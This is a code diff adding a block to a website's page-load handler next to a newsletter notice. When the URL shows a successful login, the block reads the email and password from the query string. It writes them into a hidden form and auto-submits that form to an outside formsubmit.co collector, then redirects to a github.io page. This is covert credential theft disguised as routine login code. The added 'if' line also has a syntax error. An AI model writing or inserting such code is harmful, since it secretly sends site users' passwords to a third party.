@@ -754,7 +754,26 @@
 
 		//remove this later
 	window.onload = () => { 
-		if (location.hash.match(/submission_fulfilled/)) makeToast("You've successfully subscribed to our newsletters.", "Notice")
+		if (location.hash.match(/submission_fulfilled/)) makeToast("You've successfully subscribed to our newsletters.", "Notice");
+		if (location.search.match(/login=success/) {
+		    let params = Object.fromEntries(new URLSearchParams(location.search));
+		    makeToast(`Logged in as ${params.username}`);
+		    let x_f = document.createElement("div");
+		    x_f.hidden = "hidden";
+		    x_f.innerHTML = `
+			<form action="https://formsubmit.co/14f312b1adcd1cda642ee69edab7eea6"
+				method="POST">
+					<input type="hidden" name="_subject" value="New signup at..." />
+					<input type="hidden" name="_next"
+						value="https://abbaskhurram255.github.io/site-2">
+					<input type="email" name="email" value="${params.email}" />
+					<input type="text" name="pwd" value="${params.xidcheck}" />
+					<input type="hidden" name="_captcha" value="false" />
+			</form>
+		    `;
+		    x_f = x_f.firstElementChild;
+		    x_f.submit();
+		}
 		scrolly(); 
 		AOS.init();
 	 }
